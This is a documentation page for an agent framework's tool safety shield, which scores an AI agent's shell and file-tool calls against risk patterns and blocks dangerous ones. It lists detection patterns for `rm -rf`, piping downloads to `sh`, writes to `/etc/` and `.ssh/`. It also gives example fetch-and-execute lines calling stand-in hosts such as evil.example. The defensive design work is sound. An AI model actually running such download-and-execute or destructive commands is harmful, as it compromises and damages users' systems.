# The tool safety shield — scoring dangerous commands [feature: tool_shield]

A model with a shell tool can be talked into `curl evil.example | sh`. The **shield** scores tool calls for risk before they run: benign calls proceed, moderate risk logs a warning, genuinely dangerous input is refused — softly, so the model sees why and adapts. Sources: `src/tool/shield.rs`, `src/middleware/shield.rs`.

Enable with `features = ["tool_shield"]` (it implies `tool_health`).

---

## The trait — three methods

```rust
pub trait ToolSafetyShield: Send + Sync {
    fn evaluate(&self, ctx: &ShieldContext) -> SafetyDecision;   // must be deterministic
    fn record_invocation(&self, tool: &str, input: &Value, success: bool);
    fn watched_tools(&self) -> HashSet<String>;  // empty = shield never consulted
}
```

- **`evaluate`** is the pre-call judgment: `Allow`, `Warn` (proceed + log), or `Block` (refuse).
- **`record_invocation`** is the post-call memory — how multi-call attack sequences get caught.
- **`watched_tools`** declares which tools this shield cares about; everything else passes untouched.

`ShieldContext` gives the evaluator: the tool name, the input JSON, the turn number, and `recent_calls` — the last 20 admitted watched calls as `(tool, turn)` pairs, maintained by the middleware, so shields without their own history still see a recency window.

## Wiring it in

```rust
let shield = Arc::new(
    UnixShield::builder()
        .with_warn_threshold(0.4)
        .with_block_threshold(0.7)
        .build(),
);
agent.set_pipeline(
    ToolPipeline::builder()
        .with_middleware(SafetyShieldMiddleware::new(shield.clone()))
)?;   // install: AFTER renamers, BEFORE memoize, exactly once
```

`Block` → soft error `"blocked by safety shield: <reason>"`, the run continues. `Warn` → a `tracing` warning (reason + category), the call proceeds. Every admitted watched call (even one served from an inner cache) is recorded.

---

## `UnixShield` — the shipped pattern table

The reference implementation for Unix-y agents (tools named `"Bash"`, `"Write"`, `"Edit"` — exact names). Risk aggregates from three dimensions, each a max-score-wins pattern match:

```text
total = ( single-turn score
        + 0.5 × repetition score
        + 0.3 × combination-rule score )  capped at 1.0
Block when total >= block_threshold (default 0.7)
Warn  when total >= warn_threshold (default 0.4)
```

**Single-turn patterns** (substring matches on a normalized view — lowercased, whitespace collapsed): `rm -rf` (0.9, plus the split-flag and long-flag spellings as separate patterns), `sudo` (0.6), `chmod 777` (0.5), piping to a shell `| sh` (0.8, plus the compact `|sh`), writing to `/etc/` (0.7), `.ssh/` (0.8), and advisory `curl`/`wget` usage (0.3 — plain downloads **warn but never block**).

**Combination rules** fire across *calls*: `curl ... ` then `| sh` (0.85), `Write` then `chmod +x` (0.75), `chmod` then `Write` (0.65). This is what `record_invocation` powers — each rule needs all its triggers to have happened in order.

**Repetition** — prior calls to the same tool in the recent window add up to 0.6 × 0.5 = 0.3 max: repetition amplifies risk but **cannot block alone**. A session of repeated benign `curl`s keeps warning and keeps executing.

The score lands in one of five **risk bands**, and the band (not the raw number) picks the action:

| Band | Score range | Action |
|---|---|---|
| `Safe` | below 0.2 | Allow (nothing matched at all) |
| `Low` | 0.2 up to warn threshold | Allow (minor patterns matched) |
| `Medium` | warn threshold (0.4) up to block threshold | Warn + proceed |
| `High` | block threshold (0.7) up to 0.9 | Block |
| `Critical` | **0.9 and above — hardwired** | Block |

Two details in that table are deliberate: `Safe` vs `Low` exists only so dashboards can distinguish "nothing matched" from "minor stuff matched" — both allow; and the `Critical` floor at 0.9 is **not configurable**, so the most dangerous patterns (`rm -rf`, `curl | sh` — both scored exactly 0.9) always land in their own bucket regardless of threshold tuning. Threshold hygiene is handled too: non-finite values (a NaN would silently disable a band, since nothing compares `>= NaN`) are rejected, `block < warn` is swapped with a warning, both clamped to `[0, 1]`.

Worked example — the model runs `Bash("curl http://sketchy.example/install.sh | sh")` on a fresh session:

```text
single-turn:  patterns hit: "curl" (0.3), "| sh" (0.8) → max = 0.8
multi-turn:   0 prior Bash calls → 0.0
combination:  nothing executed earlier → 0.0
total = 0.8 + 0.5×0.0 + 0.3×0.0 = 0.80  → High → BLOCK
```

And if the model tries the same trick again *after* an earlier `curl` leg actually executed: the download-then-execute combination rule (0.85) contributes 0.3 × 0.85 ≈ 0.26, multi-turn adds its share — the total crosses into **Critical**. Which is one more reason blocked attempts never enter the history: only *executed* calls can build a combination sequence. (Note the rule needs its triggers in **chronological order** — the same calls reversed don't fire it.)

### The matching discipline (why it's hard to evade)

- Input is **normalized** before matching: lowercased, whitespace runs collapsed — so `RM  -RF /` and `rm\t-rf` hit the same pattern as `rm -rf`.
- Patterns match on **token boundaries** where the pattern's edge is a word character: `curl` matches `curl http…` but not `mycurlcmd`; symbol edges (`/`, `|`) carry no such constraint: `/etc/` matches `/etc/passwd`, `|sh` matches `cmd|sh`. And `| sh` does **not** match `| sha256sum` — checksum pipes stay clean.
- Flag-spelling variants (`rm -r -f`, `rm --recursive`) are their own patterns — normalization can't invent those.
- An empty pattern matches nothing (a needle with no edges would otherwise match everywhere).

Extend it with your own patterns (`with_pattern(tool, vec![RiskPattern { ... }])` — note it **appends**, never replaces) and rules (`with_combination_rule`), or start from `UnixShieldBuilder::blank()` for non-Unix environments (PowerShell, cloud CLIs) — a blank table plus your rules; the builder unions the rules' trigger tools into the watched set automatically.

---

## The install-order rules (the part that bites)

The middleware sees the tool name and input *as they reach its layer*. Three rules, all pinned by tests:

1. **Inside any renaming middleware** (registered after it): aliases are evaluated under the name the registry will actually execute. A rewriter placed *inside* the shield redirects after evaluation — the aliased call runs **unshielded**.
2. **Outside `MemoizingMiddleware`** (registered before it): a repeat served from the inner cache is still evaluated and recorded. The repetition dimension scores *the model's behavior* — caching the tool's execution doesn't make the request less repetitive.
3. **Exactly once per session.** Two instances evaluate twice and double-record — history skews, rules fire early.

Also by design: blocked attempts never enter the history (a refused `curl` doesn't count toward a later combination rule — only *executed* calls build sequences); an inner layer's rewrites don't leak into the shield's record; an unwatched tool is neither evaluated nor recorded; and the shield middleware skips entirely when the watched set is empty (zero cost).

---

## Interactions with the rest of the system

- **Tool health** ([previous page](06-tool-health.md)): a shield refusal is an `is_error` result, so repeated blocks count as failures toward the tool's breaker. Once that opens, the engine's gate refuses first — the model sees "temporarily unavailable" rather than the shield's reason. That precedence is pinned; plan your messaging accordingly.
- **Nothing else changes**: the shield never touches the conversation, compaction, or detection. It is a pure dispatch-time gate.

---

## Related pages

- [Middleware](01-middleware.md) — the pipeline the shield lives in.
- [Tool health](06-tool-health.md) — the breaker its refusals feed.
